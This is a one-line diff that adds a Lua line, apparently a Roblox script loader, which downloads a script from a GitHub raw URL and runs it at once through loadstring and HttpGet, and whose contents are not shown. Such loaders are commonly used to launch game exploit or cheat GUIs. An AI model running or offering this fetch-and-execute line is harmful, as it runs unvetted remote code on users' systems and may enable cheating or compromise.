@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hassounijamel-cpu/NewGUI/refs/heads/main/%D8%A7%D8%B2%D8%B1%D9%82.txt"))()
